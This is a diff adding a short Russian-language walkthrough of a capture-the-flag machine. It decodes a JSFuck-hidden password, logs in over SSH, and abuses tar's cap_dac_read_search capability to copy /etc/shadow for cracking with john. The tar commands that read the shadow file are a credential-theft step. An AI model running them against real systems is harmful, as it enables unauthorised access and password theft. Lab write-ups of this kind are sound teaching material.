@@ -1,0 +1,36 @@
+1)при просмотре кода страницы /index.htm
+    нахожу там подсказки
+        /mysite/register.html и имя norris
+            нахожу файл /mysite/bootstrap.min.cs
+
+2)в нем содержится текст в интересном формате
+    var b1 = "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+"
+    var b2 = 
+    var b3 = 
+        это JSFuck кодирование
+        оббъединяя все строчки получаем пароль TryToGuessThisNorris@2k19
+
+3)заходим в ssh
+    norris:TryToGuessThisNorris@2k19
+
+4)при запуске linpeas.sh обнаруживаем 
+    files with capabilities (limited to 50):
+        /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+        /usr/bin/tar = cap_dac_read_search+ep
+        /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+        /usr/bin/ping = cap_net_raw+ep
+
+    у tar интересные права , воспользуемся им
+    ксати еще можно воспользоваться getcap -r / 2>/dev/null для поиска файлов с capabilities
+    
+5)да начнется exploiting(*)
+    /usr/bin/tar cvf /tmp/shadow.tar /etc/shadow
+    cd /tmp
+    /usr/bin/tar -xvf shadow.tar
+        и тадам появляется папка /etc в /tmp и в ней содержится файл shadow тадам!!!
+
+6)дальше воспользуемся john и что-нибудь расхэшируем
+
+
+*
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
